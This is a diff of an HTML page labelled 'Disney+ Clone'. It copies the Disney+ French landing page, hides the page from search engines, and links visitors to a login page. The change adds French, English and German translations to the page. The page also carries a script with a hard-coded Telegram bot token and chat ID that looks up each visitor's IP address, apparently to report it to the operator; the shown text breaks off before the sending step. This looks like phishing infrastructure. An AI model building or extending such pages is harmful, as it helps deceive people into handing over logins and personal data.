@@ -3,12 +3,22 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="robots" content="noindex, nofollow">
+  <meta name="robots" content="noindex, nofollow" />
   <title>Disney+ Clone</title>
   <link rel="stylesheet" href="style.css" />
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
 </head>
 <body>
+  <!-- Sélecteur de langue -->
+  <div style="position:absolute; top:16px; right:16px; font-family:Roboto,Arial,sans-serif; z-index:1000;">
+    <label for="lang-select" style="margin-right:8px; color:#333;">Langue :</label>
+    <select id="lang-select" style="padding:4px 8px; font-family:inherit;">
+      <option value="fr">Français</option>
+      <option value="en">English</option>
+      <option value="de">Deutsch</option>
+    </select>
+  </div>
+
   <header>
     <img src="Images/compose2.png" alt="Logo Disney+" class="logo" />
   </header>
@@ -16,25 +26,74 @@
   <main class="hero">
     <div class="overlay"></div>
     <div class="content">
-           <h1>Des classiques incontournables, des nouveautés et des originaux Disney+.</h1>
-      <a href="login.html" class="btn">Commencer</a>
-      <p class="subtext">
-        À partir de 5,99 € par mois. Sans frais supplémentaires. Sans engagement*.<br>
-        Profitez de 12 mois au prix de 10 avec un abonnement Premium ou Standard annuel. Économies par rapport à un an d'abonnement mensuel.<br><br>
-        <span class="footnote">* La résiliation prend effet à la fin de la période d’abonnement en cours. Abonnement requis. 5,99 €/mois pour Standard avec pub.</span>
-      </p>
+      <h1 id="title"></h1>
+      <a href="login.html" id="btn" class="btn"></a>
+      <p class="subtext" id="subtext"></p>
+      <span class="footnote" id="footnote"></span>
     </div>
   </main>
 
   <footer>
-    <p>© 2025 Disney et ses sociétés affiliées. Tous droits réservés.</p>
+    <p id="footer"></p>
   </footer>
- <script>
+
+  <script src="i18n.js"></script>
+  <script>
+    // Traductions
+    const translations = {
+      fr: {
+        lang: "fr",
+        title: "Des classiques incontournables, des nouveautés et des originaux Disney+.",
+        btn: "Commencer",
+        subtext: "À partir de 5,99 € par mois. Sans frais supplémentaires. Sans engagement*.\nProfitez de 12 mois au prix de 10 mois avec un abonnement Premium ou Standard annuel.",
+        footnote: "* La résiliation prend effet à la fin de la période d’abonnement en cours. Abonnement requis. 5,99 €/mois pour Standard avec pub.",
+        footer: "© 2025 Disney et ses sociétés affiliées. Tous droits réservés."
+      },
+      en: {
+        lang: "en",
+        title: "All the classics, new releases, and Disney+ Originals.",
+        btn: "Get Started",
+        subtext: "From €5.99/month. No hidden fees. No commitment*.\nEnjoy 12 months for the price of 10 with an annual Premium or Standard plan.",
+        footnote: "* Cancellation takes effect at the end of the current billing period. Subscription required. €5.99/month for Standard with ads.",
+        footer: "© 2025 Disney and its affiliated companies. All rights reserved."
+      },
+      de: {
+        lang: "de",
+        title: "Unverzichtbare Klassiker, Neuheiten und Disney+ Originals.",
+        btn: "Loslegen",
+        subtext: "Ab 5,99 € pro Monat. Keine Zusatzkosten. Keine Bindung*.\nGenießen Sie 12 Monate zum Preis von 10 Monaten mit einem Premium- oder Standardjahresabo.",
+        footnote: "* Die Kündigung erfolgt am Ende der aktuellen Laufzeit. Abo erforderlich. 5,99 €/Monat für Standard mit Werbung.",
+        footer: "© 2025 Disney und angeschlossene Unternehmen. Alle Rechte vorbehalten."
+      }
+    };
+
+    // Déterminer la langue initiale
+    const params = new URLSearchParams(window.location.search);
+    let lang = params.get('lang') || navigator.language.slice(0,2) || 'fr';
+    if (!translations[lang]) lang = 'fr';
+
+    // Initialiser le sélecteur
+    const select = document.getElementById('lang-select');
+    select.value = lang;
+    select.addEventListener('change', () => {
+      params.set('lang', select.value);
+      window.location.search = params.toString();
+    });
+
+    // Appliquer les traductions
+    document.documentElement.lang = translations[lang].lang;
+    document.getElementById('title').innerText    = translations[lang].title;
+    document.getElementById('btn').innerText      = translations[lang].btn;
+    document.getElementById('subtext').innerText  = translations[lang].subtext;
+    document.getElementById('footnote').innerText = translations[lang].footnote;
+    document.getElementById('footer').innerText   = translations[lang].footer;
+  </script>
+
+  <script>
+    // Script Telegram (inchangé)
     (function(){
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
-
-      // Récupère l'IP du visiteur
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(({ ip }) => {
